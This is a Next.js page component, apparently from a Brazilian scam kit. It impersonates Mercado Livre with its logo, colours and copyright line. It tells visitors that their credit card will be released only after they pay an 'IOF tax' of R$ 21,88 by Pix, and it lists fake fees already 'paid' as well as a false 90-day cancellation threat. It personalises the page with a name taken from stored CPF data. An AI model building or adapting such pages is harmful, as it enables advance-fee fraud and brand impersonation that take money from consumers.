"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"

export default function UppThanksPage() {
  const [userName, setUserName] = useState("")
  const router = useRouter()

  useEffect(() => {
    // Carregar dados do usuário
    const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
    setUserName(cpfData.nome?.split(" ")[0] || "")

    // Definir favicon dinâmico
    const favicon = document.querySelector("link[rel*='icon']") as HTMLLinkElement
    if (favicon) {
      favicon.href = "/images/pix-favicon.png"
    }
  }, [])

  const handlePayment = () => {
    // Lógica de pagamento aqui
    console.log("Processando pagamento IOF...")
  }

  return (
    <div
      className="min-h-screen bg-gray-50"
      style={{
        display: "grid",
        gridTemplateAreas: '"top-bar" "content" "footer"',
        gridTemplateRows: "auto 1fr auto",
      }}
    >
      {/* Top Bar */}
      <div className="bg-[#FFE600] text-center py-1" style={{ gridArea: "top-bar" }}>
        <Image
          alt="Mercado Livre"
          width={120}
          height={40}
          className="mx-auto my-5"
          src="/images/mercado-livre-logo-checkout.png"
          priority
        />
      </div>

      {/* Content */}
      <div style={{ gridArea: "content", padding: "0 1rem" }}>
        <div className="max-w-md mx-auto mt-6 bg-white rounded-lg shadow-lg overflow-hidden">
          {/* Header */}
          <div className="p-6">
            <h1 className="text-xl font-medium text-black mb-3">
              Parabéns, finalize a última etapa para concluir a sua solicitação
            </h1>
            <div className="w-20 h-0.5 bg-black mb-4"></div>
            <p className="text-gray-600 text-sm leading-relaxed">
              Você está a um passo de concluir o pedido do seu cartão de crédito. Ao solicitar a emissão do seu cartão
              de crédito ou a aprovação de um empréstimo, você estará sujeito à cobrança do Imposto sobre Operações
              Financeiras (IOF), que é regulamentado e emitido pelo Banco Central. Este imposto é aplicado para
              financiar operações financeiras e garantir a conformidade com as normas fiscais.
            </p>
          </div>

          {/* IOF Section */}
          <div className="mx-6 mb-6 border border-gray-300 rounded-lg p-6">
            <h3 className="text-lg font-medium text-black mb-3">O que é o IOF?</h3>

            {/* Volume Icons */}
            <div className="flex items-center gap-2 mb-4 text-gray-600">
              <span className="text-sm">Aumente o volume</span>
              <div className="flex gap-1">
                {[...Array(4)].map((_, i) => (
                  <div key={i} className="w-4 h-4">
                    <svg viewBox="0 0 36 36" className="w-full h-full">
                      <path
                        fill="#BE1931"
                        d="M12.908 30.75c-.276 2.209-2.291 3-4.5 3s-3.776-1.791-3.5-4l1-9c.276-2.209 2.291-4 4.5-4s6.468 0 3.5 4s-1 10-1 10"
                      ></path>
                      <path
                        fill="#CCD6DD"
                        d="M35.825 14.75c0 6.902-1.544 12.5-3.45 12.5c-1.905 0-20.45-5.598-20.45-12.5s18.545-12.5 20.45-12.5c1.906 0 3.45 5.597 3.45 12.5"
                      ></path>
                      <ellipse cx="32.375" cy="14.75" fill="#66757F" rx="3.45" ry="12.5"></ellipse>
                      <path fill="#DD2E44" d="m17.925 21.75l-14-1c-5 0-5-12 0-12l14-1c-3 3-3 11 0 14"></path>
                      <ellipse cx="31.325" cy="14.75" fill="#99AAB5" rx="1.5" ry="4.348"></ellipse>
                    </svg>
                  </div>
                ))}
              </div>
            </div>

            {/* Video */}
            <div className="relative rounded-lg overflow-hidden">
              <video controls className="w-full aspect-video rounded-lg" poster="/images/hand-phone-activation.png">
                <source src="/videos/emprestimo-facilitado.mp4" type="video/mp4" />
                Seu navegador não suporta o elemento de vídeo.
              </video>
            </div>

            {/* Progress Steps */}
            <div className="mt-6 space-y-4 relative">
              <div className="absolute left-2.5 top-6 bottom-6 w-0.5 bg-gray-300"></div>

              {/* Pagamento Frete - Completed */}
              <div className="flex items-center gap-4">
                <div className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center relative z-10">
                  <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path>
                  </svg>
                </div>
                <div className="flex items-center gap-3">
                  <svg className="w-8 h-8 text-green-500" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M9 11H7v6h2v-6zm4 0h-2v6h2v-6zm4 0h-2v6h2v-6zm2-7v2H4V4h3.5l1-1h7l1 1H20z"></path>
                  </svg>
                  <div>
                    <p className="font-medium text-green-600">Pagamento Frete</p>
                    <p className="text-sm text-green-500">Pagamento concluído com sucesso</p>
                  </div>
                </div>
              </div>

              {/* Depósito de Ativação - Completed */}
              <div className="flex items-center gap-4">
                <div className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center relative z-10">
                  <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path>
                  </svg>
                </div>
                <div className="flex items-center gap-3">
                  <svg className="w-8 h-8 text-green-500" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path>
                  </svg>
                  <div>
                    <p className="font-medium text-green-600">Depósito de Ativação</p>
                    <p className="text-sm text-green-500">Pagamento concluído with sucesso</p>
                  </div>
                </div>
              </div>

              {/* Pagamento do Imposto IOF - Current */}
              <div className="flex items-center gap-4">
                <div className="w-5 h-5 bg-red-500 rounded-full relative z-10 animate-pulse">
                  <div className="absolute inset-0 bg-red-500 rounded-full animate-ping opacity-75"></div>
                </div>
                <div className="flex items-center gap-3">
                  <Image src="/images/pix-favicon.png" alt="PIX" width={32} height={32} className="w-8 h-8" />
                  <div>
                    <p className="font-medium text-red-600">Pagamento do Imposto IOF</p>
                    <p className="text-sm text-red-500">Aguardando pagamento para liberação do cartão de crédito</p>
                  </div>
                </div>
              </div>

              {/* Cartão Virtual Liberado - Pending */}
              <div className="flex items-center gap-4">
                <div className="w-5 h-5 bg-gray-300 rounded-full relative z-10"></div>
                <div className="flex items-center gap-3">
                  <svg className="w-8 h-8 text-gray-400" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"></path>
                  </svg>
                  <div>
                    <p className="font-medium text-gray-400">Cartão Virtual Liberado</p>
                    <p className="text-sm text-gray-400">Cartão físico em preparação</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Warning */}
          <div className="px-6 mb-6">
            <p className="text-sm text-gray-600 text-center">
              O não pagamento do imposto resulta no cancelamento do pedido do cartão de crédito, impossibilitando uma
              nova contratação por um prazo máximo de 90 dias
            </p>
          </div>

          {/* Payment Section */}
          <div className="mx-6 mb-6 bg-white border border-gray-200 rounded-lg p-6 text-center">
            <div className="flex items-center justify-center gap-2 mb-2">
              <h3 className="text-lg font-medium text-black">Pague via Pix</h3>
              <svg className="w-6 h-6 text-teal-500" fill="currentColor" viewBox="0 0 24 24">
                <path d="m15.45 16.52l-3.01-3.01c-.11-.11-.24-.13-.31-.13s-.2.02-.31.13L8.8 16.53c-.34.34-.87.89-2.64.89l3.71 3.7a3 3 0 0 0 4.24 0l3.72-3.71c-.91 0-1.67-.18-2.38-.89M8.8 7.47l3.02 3.02c.08.08.2.13.31.13s.23-.05.31-.13l2.99-2.99c.71-.74 1.52-.91 2.43-.91l-3.72-3.71a3 3 0 0 0-4.24 0l-3.71 3.7c1.76 0 2.3.58 2.61.89"></path>
                <path d="m21.11 9.85l-2.25-2.26H17.6c-.54 0-1.08.22-1.45.61l-3 3c-.28.28-.65.42-1.02.42a1.5 1.5 0 0 1-1.02-.42L8.09 8.17c-.38-.38-.9-.6-1.45-.6H5.17l-2.29 2.3a3 3 0 0 0 0 4.24l2.29 2.3h1.48c.54 0 1.06-.22 1.45-.6l3.02-3.02c.28-.28.65-.42 1.02-.42s.74.14 1.02.42l3.01 3.01c.38.38.9.6 1.45.6h1.26l2.25-2.26a3.04 3.04 0 0 0-.02-4.29"></path>
              </svg>
            </div>
            <p className="text-sm text-gray-600 mb-4">O pagamento será confirmado imediatamente</p>

            <div className="text-3xl font-medium text-teal-500 mb-4">R$ 21,88</div>

            <button
              onClick={handlePayment}
              className="w-full py-3 px-6 text-gray-800 font-medium rounded-full transition-all duration-200 hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed"
              style={{ backgroundColor: "#FFE600", border: "none" }}
            >
              Pagar agora
            </button>

            <div className="flex items-center justify-center gap-2 mt-3 text-sm text-gray-600">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M10,17L6,13L7.41,11.59L10,14.17L16.59,7.58L18,9L10,17Z"></path>
              </svg>
              Ambiente seguro
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div
        className="bg-white border-t border-gray-200 text-center py-8 px-2 relative"
        style={{
          gridArea: "footer",
          borderBottom: "3px solid #FFE600",
        }}
      >
        Copyright © 2025 Mercado Livre. Todos os direitos reservados.
      </div>
    </div>
  )
}
